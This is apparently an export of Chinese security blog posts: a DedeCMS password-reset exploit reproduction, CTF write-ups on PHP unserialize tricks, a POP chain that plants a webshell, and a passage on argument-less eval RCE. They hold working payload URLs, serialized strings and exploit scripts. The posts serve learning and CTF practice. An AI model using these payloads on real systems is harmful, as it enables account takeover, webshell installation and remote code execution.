请于三天内登陆下面网址确认修改。\r\n".$cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&amp;id=".$mid; if($type == 'INSERT') &#123; $key = md5($randval); $sql = "INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES ('$mid', '$userid', '$key', '$mailtime');"; if($db-&gt;ExecuteNoneQuery($sql)) &#123; if($send == 'Y') &#123; sendmail($mailto,$mailtitle,$mailbody,$headers); return ShowMsg('EMAIL修改验证码已经发送到原来的邮箱请查收', 'login.php','','5000'); &#125; else if ($send == 'N') &#123; return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&amp;amp;id=".$mid."&amp;amp;key=".$randval); &#125; &#125; else &#123; return ShowMsg('对不起修改失败，请联系管理员', 'login.php'); &#125; &#125; elseif($type == 'UPDATE') &#123; $key = md5($randval); $sql = "UPDATE `#@__pwd_tmp` SET `pwd` = '$key',mailtime = '$mailtime' WHERE `mid` ='$mid';"; if($db-&gt;ExecuteNoneQuery($sql)) &#123; if($send == 'Y') &#123; sendmail($mailto,$mailtitle,$mailbody,$headers); ShowMsg('EMAIL修改验证码已经发送到原来的邮箱请查收', 'login.php'); &#125; elseif($send == 'N') &#123; return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&amp;amp;id=".$mid."&amp;amp;key=".$randval); &#125; &#125; else &#123; ShowMsg('对不起修改失败，请与管理员联系', 'login.php'); &#125; &#125;&#125; 根据前面的参数传递，最后会执行到这里 1return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&amp;amp;id=".$mid."&amp;amp;key=".$randval); 在这里$randval是我们所不知道的随机字符串，但是该行信息会进行回显输出，这也正是我们进行下一步密码重置操作所需要的链接 我们继续来看getpasswd的操作，代码位于 member\resetpassword.php，关键代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556else if($dopost == "getpasswd")&#123; //修改密码 if(empty($id)) &#123; ShowMsg("对不起，请不要非法提交","login.php"); exit(); &#125; $mid = preg_replace("#[^0-9]#", "", $id); $row = $db-&gt;GetOne("SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'"); if(empty($row)) &#123; ShowMsg("对不起，请不要非法提交","login.php"); exit(); &#125; if(empty($setp)) &#123; $tptim= (60*60*24*3); $dtime = time(); if($dtime - $tptim &gt; $row['mailtime']) &#123; $db-&gt;executenonequery("DELETE FROM `#@__pwd_tmp` WHERE `md` = '$id';"); ShowMsg("对不起，临时密码修改期限已过期","login.php"); exit(); &#125; require_once(dirname(__FILE__)."/templets/resetpassword2.htm"); &#125; elseif($setp == 2) &#123; if(isset($key)) $pwdtmp = $key; $sn = md5(trim($pwdtmp)); if($row['pwd'] == $sn) &#123; if($pwd != "") &#123; if($pwd == $pwdok) &#123; $pwdok = md5($pwdok); $sql = "DELETE FROM `#@__pwd_tmp` WHERE `mid` = '$id';"; $db-&gt;executenonequery($sql); $sql = "UPDATE `#@__member` SET `pwd` = '$pwdok' WHERE `mid` = '$id';"; if($db-&gt;executenonequery($sql)) &#123; showmsg('更改密码成功，请牢记新密码', 'login.php'); exit; &#125; &#125; &#125; showmsg('对不起，新密码为空或填写不一致', '-1'); exit; &#125; showmsg('对不起，临时密码错误', '-1'); exit; &#125;&#125; 第一次会执行到这里 123456789101112if(empty($setp))&#123; $tptim= (60*60*24*3); $dtime = time(); if($dtime - $tptim &gt; $row['mailtime']) &#123; $db-&gt;executenonequery("DELETE FROM `#@__pwd_tmp` WHERE `md` = '$id';"); ShowMsg("对不起，临时密码修改期限已过期","login.php"); exit(); &#125; require_once(dirname(__FILE__)."/templets/resetpassword2.htm");&#125; 该段代码最后请求了/templets/resetpassword2.htm 这个页面，我们来看一下 页面将step的值修改为2后又回到上面那段代码，接着执行该段 12345678910111213141516171819202122elseif($setp == 2) &#123; if(isset($key)) $pwdtmp = $key; $sn = md5(trim($pwdtmp)); if($row['pwd'] == $sn) &#123; if($pwd != "") &#123; if($pwd == $pwdok) &#123; $pwdok = md5($pwdok); $sql = "DELETE FROM `#@__pwd_tmp` WHERE `mid` = '$id';"; $db-&gt;executenonequery($sql); $sql = "UPDATE `#@__member` SET `pwd` = '$pwdok' WHERE `mid` = '$id';"; if($db-&gt;executenonequery($sql)) &#123; showmsg('更改密码成功，请牢记新密码', 'login.php'); exit; &#125; &#125; &#125; 该段进行了最后一步重置密码的操作 漏洞利用首先访问链接 http://127.0.0.1/dedecms/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;id=1 抓包repeater取回带有key的链接 访问该链接，即可重置密码]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0ctf-2016-Unserialize题目分析]]></title>
    <url>%2F2019%2F07%2F16%2F0ctf-2016-Unserialize%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[题目有源码泄露，打开备份文件开始审计，注意到flag在config.php中 贴上部分需要分析的代码： update.php 1234567891011121314151617181920212223242526272829303132&lt;?php require_once('class.php'); if($_SESSION['username'] == null) &#123; die('Login First'); &#125; if($_POST['phone'] &amp;&amp; $_POST['email'] &amp;&amp; $_POST['nickname'] &amp;&amp; $_FILES['photo']) &#123; $username = $_SESSION['username']; if(!preg_match('/^\d&#123;11&#125;$/', $_POST['phone'])) die('Invalid phone'); if(!preg_match('/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/', $_POST['email'])) die('Invalid email'); if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname'); $file = $_FILES['photo']; if($file['size'] &lt; 5 or $file['size'] &gt; 1000000) die('Photo size error'); move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name'])); $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); $user-&gt;update_profile($username, serialize($profile)); echo 'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'; &#125; else &#123;?&gt; profile.php 1234567891011121314151617&lt;?php require_once('class.php'); if($_SESSION['username'] == null) &#123; die('Login First'); &#125; $username = $_SESSION['username']; $profile=$user-&gt;show_profile($username); if($profile == null) &#123; header('Location: update.php'); &#125; else &#123; $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo']));?&gt; 首先注册登录，然后有更新信息的功能 分析下upload.php中的代码 注意到该处正则表达式是有缺陷的，我们可以使用数组的方式来绕过该处的长度限制 12345678910&lt;?php//test.phpif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10)&#123; echo 'die.&lt;br&gt;';&#125;else&#123; echo 'gone.&lt;br&gt;';&#125;var_dump($_POST['nickname']); 然后继续看profile的源码，发现了读取文件的函数 1$photo = base64_encode(file_get_contents($profile['photo'])); 这样我们可以反序列化控制$photo的值为config.php来获取flag 转回来我们看一下update.php中的序列化操作，代码抽取出来是这样的 1234567&lt;?php$profile['phone'] = $_POST['phone'];$profile['email'] = $_POST['email'];$profile['nickname'] = $_POST['nickname'];$profile['photo'] = 'upload/' . md5($_POST['filename']);echo serialize($profile);?&gt; nickname可以使用数组绕过限制 1a:4:&#123;s:5:"phone";s:12:"133323233434";s:5:"email";s:12:"10000@qq.com";s:8:"nickname";a:1:&#123;i:0;s:15:"aaaaabbbbbccccc";&#125;s:5:"photo";s:39:"upload/f3ccdd27d2000e3f9255a7e3e2c48800";&#125; 这是正常的序列化字符串，为了控制phpto的值，我们可以利用nickname来构造我们想要的序列化字符串 例如这样： 1a:4:&#123;s:5:"phone";s:12:"133323233434";s:5:"email";s:12:"10000@qq.com";s:8:"nickname";a:1:&#123;i:0;s:15:"";&#125;s:5:"photo";s:10:"config.php";&#125;";&#125;s:5:"photo";s:39:"upload/f3ccdd27d2000e3f9255a7e3e2c48800";&#125; 这样我们需要输入的nickname就应该包含这一段 1";&#125;s:5:"photo";s:10:"config.php";&#125; 然后我们来研究如何使该段字符串逃出双引号的限制 我们注意到在序列化之后调用了show_profile函数 而该函数存在一个过滤器 123456789public function filter($string) &#123; $escape = array('\'', '\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string); &#125; 其中五位的where会被替换成6位的hacker这样序列化字符串就会多出一位，我们可以多输入几个where来达到逃出双引号限制的目的 可以看到我们需要输入34个where 接着进行利用，将nickname[]的值改为 1wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";&#125;s:5:"photo";s:10:"config.php";&#125; 然后访问profile.php 得到了config.php的base64编码，解码即可]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反序列化相关问题注意点]]></title>
    <url>%2F2019%2F07%2F14%2F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E6%B3%A8%E6%84%8F%E7%82%B9%2F</url>
    <content type="text"><![CDATA[private与protected问题private当类内对象为private属性时，生成序列化字符串后会有一些不同，例如如下代码 1234567891011121314151617&lt;?phpclass Student &#123; private $name = 'yemoli'; public $sex = 'man'; function __destruct() &#123; echo '&lt;/br&gt;'; echo '__destruct is working'; echo '&lt;/br&gt;'; echo 'I am:' . $this-&gt;name; echo '&lt;/br&gt;'; &#125;&#125;$a = new Student();$b = serialize($a);echo $b;?&gt; 生成的序列化字符串如下 可以看到与public属性时的不同，在这时我们构造序列化字符串时可以使用%00代替两个奇怪的字符 1O:7:"Student":2:&#123;s:13:"%00Student%00name";s:6:"yemoli";s:3:"sex";s:3:"man";&#125; 验证代码 12345678910111213141516&lt;?phpclass Student &#123; private $name = 'Zhangsan'; public $sex = 'man'; function __destruct() &#123; echo '&lt;/br&gt;'; echo '__destruct is working'; echo '&lt;/br&gt;'; echo 'I am:' . $this-&gt;name; echo '&lt;/br&gt;'; &#125;&#125;$a = $_GET['str'];unserialize($a);?&gt; payload: 1http://127.0.0.1/test2.php?str=O:7:"Student":2:&#123;s:13:"%00Student%00name";s:6:"yemoli";s:3:"sex";s:3:"man";&#125; result： protected使用如下代码生成序列化字符串 12345678910111213141516&lt;?phpclass Student &#123; protected $name = 'yemoli'; public $sex = 'man'; function __destruct() &#123; echo '&lt;/br&gt;'; echo '__destruct is working'; echo '&lt;/br&gt;'; echo 'I am:' . $this-&gt;name; echo '&lt;/br&gt;'; &#125;&#125;$a = new Student();$b = serialize($a);echo $b;?&gt; 我们看一下生成的序列化代码 这时会发现在protected属性时还会生成一个*，同样的把不可见字符替换为%00即可 1O:7:"Student":2:&#123;s:7:"%00*%00name";s:6:"yemoli";s:3:"sex";s:3:"man";&#125; 验证代码： 12345678910111213141516&lt;?phpclass Student &#123; protected $name = 'Zhangsan'; public $sex = 'man'; function __destruct() &#123; echo '&lt;/br&gt;'; echo '__destruct is working'; echo '&lt;/br&gt;'; echo 'I am:' . $this-&gt;name; echo '&lt;/br&gt;'; &#125;&#125;$a = $_GET['str'];unserialize($a);?&gt; payload: 1http://127.0.0.1/test2.php?str=O:7:"Student":2:&#123;s:7:"%00*%00name";s:6:"yemoli";s:3:"sex";s:3:"man";&#125; result: __wakeup()绕过经测试该方法仅适用于php5.5及以下版本 生成代码 12345678910111213141516&lt;?phpclass Student &#123; protected $name = 'yemoli'; public $sex = 'man'; function __destruct() &#123; echo '&lt;/br&gt;'; echo '__destruct is working'; echo '&lt;/br&gt;'; echo 'I am:' . $this-&gt;name; echo '&lt;/br&gt;'; &#125;&#125;$a = new Student();$b = serialize($a);echo $b;?&gt; 正常生成的是这样的 1O:7:"Student":2:&#123;s:7:"%00*%00name";s:6:"yemoli";s:3:"sex";s:3:"man";&#125; 想要绕过wakeup函数我们需要使student后的数值大于现在的数值例如将2改为3 1O:7:"Student":3:&#123;s:7:"%00*%00name";s:6:"yemoli";s:3:"sex";s:3:"man";&#125; 验证代码 12345678910111213141516171819202122&lt;?phpclass Student &#123; protected $name = 'Zhangsan'; public $sex = 'man'; function __destruct() &#123; echo '&lt;/br&gt;'; echo '__destruct is working'; echo '&lt;/br&gt;'; echo 'I am:' . $this-&gt;name; echo '&lt;/br&gt;'; &#125; function __wakeup() &#123; echo ' __wake is working'; echo '&lt;/br&gt;'; echo 'I am:' . $this-&gt;name = 'zhangsan'; echo '&lt;/br&gt;'; &#125;&#125;$a = $_GET['str'];unserialize($a);?&gt; payload 1http://127.0.0.1/test2.php?str=O:7:"Student":3:&#123;s:7:"%00*%00name";s:6:"yemoli";s:3:"sex";s:3:"man";&#125; 成功的绕过了__wakeup() 使用+绕过该方法在PHP5.6.24版本已被修复 有如下题目代码 12345678910111213141516171819202122232425262728293031323334353637&lt;?php @error_reporting(1); include 'flag.php';class baby &#123; public $file; function __toString() &#123; if(isset($this-&gt;file)) &#123; $filename = "./&#123;$this-&gt;file&#125;"; if (file_get_contents($filename)) &#123; return file_get_contents($filename); &#125; &#125; &#125; &#125; if (isset($_GET['data'])) &#123; $data = $_GET['data']; preg_match('/[oc]:\d+:/i',$data,$matches); if(count($matches)) &#123; die('Hacker!'); &#125; else &#123; $good = unserialize($data); echo $good; &#125; &#125; else &#123; highlight_file("./test3.php"); &#125; ?&gt; 注意这里 1preg_match('/[oc]:\d+:/i',$data,$matches); 正常编写利用代码 1234567891011121314151617181920&lt;?phpclass baby &#123; public $file= "flag.php"; function __toString() &#123; if(isset($this-&gt;file)) &#123; $filename = "./&#123;$this-&gt;file&#125;"; if (file_get_contents($filename)) &#123; return file_get_contents($filename); &#125; &#125; &#125; &#125; $a = new baby();$b = serialize($a);echo $b;?&gt; 得到 1O:4:"baby":1:&#123;s:4:"file";s:8:"flag.php";&#125; 为了绕过正则，在fuzz后发现可以使用加号进行绕过，但注意需要URL编码一下，因为在某些时候+直接使用会被当成空格来处理 payload： 1O:%2b4:"baby":1:&#123;s:4:"file";s:8:"flag.php";&#125; session的反序列化PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样就可能存在反序列化漏洞 首先了解一下session三种序列化的方式 然后我们以jarvisoj上一道题目为例：http://web.jarvisoj.com:32784/ 题目存在index和phpinfo两个页面 index: 1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; 仔细观察会发现在index和phpinfo两个页面中使用的是两个不同的序列化引擎 这时我们自然联想到session的反序列化漏洞，但这是我们会发现我们似乎找不到突破点来控制session，经过仔细搜索 发现这里我们可以通过利用PHP_SESSION_UPLOAD_PROGRESS上传文件来控制session的内容(当一个上传在处理中，同时POST一个与php.ini中设置的session.upload_progress.name同名变量时，上传进度就可以在$_SESSION中获得) 这样我们可以构造如下的上传请求 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;test&lt;/title&gt; &lt;meta charset="utf-8" /&gt; &lt;/head&gt; &lt;body&gt; &lt;form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"&gt; &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /&gt; &lt;input type="file" name="file" /&gt; &lt;input type="submit" /&gt;&lt;/form&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 接着我们需要知道哪里是我们可控的点，翻阅PHP手册 不难看出我们可以控制文件名来写入session文件 接下来我们来写利用代码 1234567891011121314151617181920&lt;?phpclass OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125; $a = new OowoO();$a-&gt;mdzz='var_dump(scandir(dirname(__FILE__)));';$b = serialize($a);echo $b;?&gt;//O:5:"OowoO":1:&#123;s:4:"mdzz";s:37:"var_dump(scandir(dirname(__FILE__)));";&#125; 使用”\”将双引号转义一下，同时为了触发index页面的引擎我们需要在序列化字符串前加”|” 可以看到成功触发了反序列化，接着我们读取flag文件就好了 123O:5:"OowoO":1:&#123;s:4:"mdzz";s:90:"var_dump(file_get_contents(dirname(__FILE__)."/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));";&#125;转义O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:90:\"var_dump(file_get_contents(dirname(__FILE__).\"/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";&#125; phar反序列化该方法在某些文件系统函数参数可控的情况下，与phar://伪协议配合使用可不使用unserialize()实现反序列化操作 受影响的文件系统函数如下 (图片源于网络) 有如下示例代码 12345678910&lt;?phpclass TestObject&#123; function __destruct() &#123; echo $this -&gt; mini; &#125;&#125;$a = $_GET['file'];file_get_contents($a);?&gt; 可以看到并没有unserialize()函数，同时存在file_get_contents函数，我们可以利用phar来触发反序列化 利用代码 12345678910111213&lt;?php class TestObject &#123; &#125; $phar = new Phar("phar.phar"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub("&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub $o = new TestObject(); $o -&gt; mini='yemoli'; $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 运行代码后会生成一个phar.phar文件，生成的该文件后缀名可以随意更改，接下来使用phar://伪协议进行利用 1127.0.0.1/index.php?file=phar://phar.phar 可以看到成功的触发了反序列化。 参考链接： https://paper.seebug.org/680/]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[强网杯2019 upload题目复现]]></title>
    <url>%2F2019%2F06%2F07%2F%E5%BC%BA%E7%BD%91%E6%9D%AF2019-upload%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[前言端午假期没什么事情，想着复现下强网的题目，正好前两天朋友给了个题目复现环境，想着好好总结一下 https://github.com/CTFTraining/CTFTraining/blob/master/README.md 源码分析重要部分源码如下Profile.php12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;?phpnamespace app\web\controller;use think\Controller;class Profile extends Controller&#123; public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __construct() &#123; $this-&gt;checker=new Index(); $this-&gt;upload_menu=md5($_SERVER['REMOTE_ADDR']); @chdir("../public/upload"); if(!is_dir($this-&gt;upload_menu))&#123; @mkdir($this-&gt;upload_menu); &#125; @chdir($this-&gt;upload_menu); &#125; public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index"; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES['upload_file']['tmp_name']; $this-&gt;filename=md5($_FILES['upload_file']['name']).".png"; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img="../upload/$this-&gt;upload_menu/$this-&gt;filename"; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error('Forbidden type!', url('../index')); &#125; &#125;else&#123; $this-&gt;error('Unknow file type!', url('../index')); &#125; &#125; public function update_img()&#123; $user_info=db('user')-&gt;where("ID",$this-&gt;checker-&gt;profile['ID'])-&gt;find(); if(empty($user_info['img']) &amp;&amp; $this-&gt;img)&#123; if(db('user')-&gt;where('ID',$user_info['ID'])-&gt;data(["img"=&gt;addslashes($this-&gt;img)])-&gt;update())&#123; $this-&gt;update_cookie(); $this-&gt;success('Upload img successful!', url('../home')); &#125;else&#123; $this-&gt;error('Upload file failed!', url('../index')); &#125; &#125; &#125; public function update_cookie()&#123; $this-&gt;checker-&gt;profile['img']=$this-&gt;img; cookie("user",base64_encode(serialize($this-&gt;checker-&gt;profile)),3600); &#125; public function ext_check()&#123; $ext_arr=explode(".",$this-&gt;filename); $this-&gt;ext=end($ext_arr); if($this-&gt;ext=="png")&#123; return 1; &#125;else&#123; return 0; &#125; &#125; public function __get($name) &#123; return $this-&gt;except[$name]; &#125; public function __call($name, $arguments) &#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125;&#125; Register.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?phpclass Register&#123; public $checker; public $registed; public function register() &#123; if ($this-&gt;checker) &#123; if($this-&gt;checker-&gt;login_check())&#123; $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/home"; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if (!empty(input("post.username")) &amp;&amp; !empty(input("post.email")) &amp;&amp; !empty(input("post.password"))) &#123; $email = input("post.email", "", "addslashes"); $password = input("post.password", "", "addslashes"); $username = input("post.username", "", "addslashes"); if($this-&gt;check_email($email)) &#123; if (empty(db("user")-&gt;where("username", $username)-&gt;find()) &amp;&amp; empty(db("user")-&gt;where("email", $email)-&gt;find())) &#123; $user_info = ["email" =&gt; $email, "password" =&gt; md5($password), "username" =&gt; $username]; if (db("user")-&gt;insert($user_info)) &#123; $this-&gt;registed = 1; $this-&gt;success('Registed successful!', url('../index')); &#125; else &#123; $this-&gt;error('Registed failed!', url('../index')); &#125; &#125; else &#123; $this-&gt;error('Account already exists!', url('../index')); &#125; &#125;else&#123; $this-&gt;error('Email illegal!', url('../index')); &#125; &#125; else &#123; $this-&gt;error('Something empty!', url('../index')); &#125; &#125; public function check_email($email)&#123; $pattern = "/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]&#123;2,&#125;)$/"; preg_match($pattern, $email, $matches); if(empty($matches))&#123; return 0; &#125;else&#123; return 1; &#125; &#125; public function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125; &#125;&#125; Index.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?phpnamespace app\web\controller;use think\Controller;class Index extends Controller&#123; public $profile; public $profile_db; public function index() &#123; if($this-&gt;login_check())&#123; $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/home"; $this-&gt;redirect($curr_url,302); exit(); &#125; return $this-&gt;fetch("index"); &#125; public function home()&#123; if(!$this-&gt;login_check())&#123; $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index"; $this-&gt;redirect($curr_url,302); exit(); &#125; if(!$this-&gt;check_upload_img())&#123; $this-&gt;assign("username",$this-&gt;profile_db['username']); return $this-&gt;fetch("upload"); &#125;else&#123; $this-&gt;assign("img",$this-&gt;profile_db['img']); $this-&gt;assign("username",$this-&gt;profile_db['username']); return $this-&gt;fetch("home"); &#125; &#125; public function login_check()&#123; $profile=cookie('user'); if(!empty($profile))&#123; $this-&gt;profile=unserialize(base64_decode($profile)); $this-&gt;profile_db=db('user')-&gt;where("ID",intval($this-&gt;profile['ID']))-&gt;find(); if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null)&#123; return 1; &#125;else&#123; return 0; &#125; &#125; &#125; public function check_upload_img()&#123; if(!empty($this-&gt;profile) &amp;&amp; !empty($this-&gt;profile_db))&#123; if(empty($this-&gt;profile_db['img']))&#123; return 0; &#125;else&#123; return 1; &#125; &#125; &#125; public function logout()&#123; cookie("user",null); $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index"; $this-&gt;redirect($curr_url,302); exit(); &#125; public function __get($name) &#123; return ""; &#125;&#125; 接下来我们开始分析源码首先我们题目入手时应该寻找可控的输入点，经过一番寻找后，在index.php中发现了cookie的反序列化操作 cookie是我们可以控制的，所以可以以此为突破口进行进一步分析，题目登陆后有文件上传功能，我们重点看一下Profile.php中的代码在upload_img()函数中，发现了如下代码段当全局变量$_FILES 不为空时，我们上传的文件会先保存为临时文件，然后在复制到upload文件夹下，这里会注意到，由于filename_tmp和filename均为public属性，我们可以控制这两个变量，将临时文件控制为我们想要上传的木马文件接下来我们要做的事就是触发upload_img函数，继续分析源码注意到Register.php中的destruct方法在这里我们同样可以控制checker为Profile类的一个对象，这样由于Profile中没有index方法，就会触发Profile中的call方法在call方法中我们注意到 $this-&gt;{$name} 相当于 $this-&gt;index 这样进而会触发__get方法同样对于expect我们是可以控制的，我们可以控制expect为upload_img进而调用该函数达到恶意文件的生成最后我们来看upload_img函数，我们需要绕过两个判断这两处相对来说比较简单了，checker是可控的，我们直接置0就可以了，对于第二个if我们在利用时不用上传文件所以就直接绕过了最后梳理一下反序列化利用链 __destruct()--&gt;__call()--&gt;__get()--&gt;upload_img() 实战利用注册账号，登录，然后制作图片马上传，得到我们要copy”临时文件”的路径 然后经过上面的分析我们可以构造出如下的漏洞利用代码1234567891011121314151617181920212223242526&lt;?phpnamespace app\web\controller;class Profile&#123; public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except;&#125;class Register&#123; public $checker; public $registed;&#125;$yml = new Register();$yml-&gt;registed=0;$yml-&gt;checker=new Profile();$yml-&gt;checker-&gt;except=array('index'=&gt;'upload_img');$yml-&gt;checker-&gt;checker=0;$yml-&gt;checker-&gt;ext=1;$yml-&gt;checker-&gt;filename_tmp="./upload/a7a3cba0eead18324c8b3e2f013dea71/97fa7719c9699fdb67790374376816ba.png";$yml-&gt;checker-&gt;filename="./upload/a7a3cba0eead18324c8b3e2f013dea71/yemoli.php";echo base64_encode(serialize($yml)); 我们需要修改cookie的值，所以base64编码一下成功的生成的我们需要的一句话 蚂蚁连接一下 总结感觉如果对于魔法函数熟悉的话，题目上手不会太难，后续计划总结一下各个魔法函数的特性，这样对于反序列化题目会更得心应手一些。 参考链接：https://chxing.xyz/2019/05/27/QWB反序列化 https://altman.vip/2019/05/27/QWB2019-writeup/]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP无参数实现RCE]]></title>
    <url>%2F2019%2F05%2F24%2FPHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%AE%9E%E7%8E%B0RCE%2F</url>
    <content type="text"><![CDATA[最近在学习和总结代码审计的一些奇淫技巧，正好看到codebreaking上的题目，去年做的时候还是没什么头绪，所以准备完整学习总结下,预计会多写几篇这样的技巧记录，多学习一些tricks顺便还能开阔眼界。 示例背景以codebreaking的phplimit题目为例，我们以实现RCE为目的来进行分析 题目代码 &lt;?php if(&apos;;&apos; === preg_replace(&apos;/[^\W]+\((?R)?\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) { eval($_GET[&apos;code&apos;]); } else { show_source(__FILE__); } 首先我们简单分析下正则部分 [^\W]的意思是包括所有数字字母和下划线，而((?R)?)表示重复进行整个模式 这意味着我们需要输入可以循环嵌套的字符串，也就意味着如果我们输入一个有参数的函数，将不会成功的匹配正则 所以输入点我们虽然可以输入函数，但是不能输入有参数的函数 下面讨论下bypass的方法 nginx下的利用基于get_defined_vars()函数的利用我们看一下该函数的官方文档 我们可以通过定义新的变量来控制该函数的返回值 例如下面这样 array(4) { [&quot;_GET&quot;]=&gt; array(2) { [&quot;yml&quot;]=&gt; string(4) &quot;cool&quot; [&quot;code&quot;]=&gt; string(29) &quot;var_dump(get_defined_vars());&quot; } [&quot;_POST&quot;]=&gt; array(0) { } [&quot;_COOKIE&quot;]=&gt; array(0) { } [&quot;_FILES&quot;]=&gt; array(0) { } } 我们可以使cool变成我们想要执行的代码，例如phpinfo(); http://127.0.0.1/demo5.php?yml=phpinfo();&amp;code=var_dump(get_defined_vars()); 然后我们现在要想办法将我们想执行的代码从数组中提取出来 用到下面几个函数 先用current函数取出get键值所对应的值 http://127.0.0.1/demo5.php?yml=phpinfo();&amp;code=var_dump(current(get_defined_vars())); 然后再利用array_values函数 将数组的值重新组成一个数组 http://127.0.0.1/demo5.php?yml=phpinfo();&amp;code=var_dump(array_values(current(get_defined_vars()))); 再次利用current函数取出数组第一个值 http://127.0.0.1/demo5.php?yml=phpinfo();&amp;code=var_dump(current(array_values(current(get_defined_vars())))); 将var_dump改成eval即可实现RCE http://127.0.0.1/demo5.php?yml=phpinfo();&amp;code=eval(current(array_values(current(get_defined_vars())))); 控制header头某些参数我们可以控制header的某些参数来实现恶意代码的传输，这时我们需要利用code参数来传入一个获取header属性值的函数 head头中最常见的属性就是cookie了，我们可以利用session_id()这个函数 我们可以控制sessionid的值，然后用session_id()来获取sessionid 由于sessionid格式的限制，我们可以将想控制的参数转为16进制，然后在code处使用hex2bin函数将16进制数转字符串函数即可 我们实际测试一下 首先将phpinfo();转成16进制数 然后请求URL 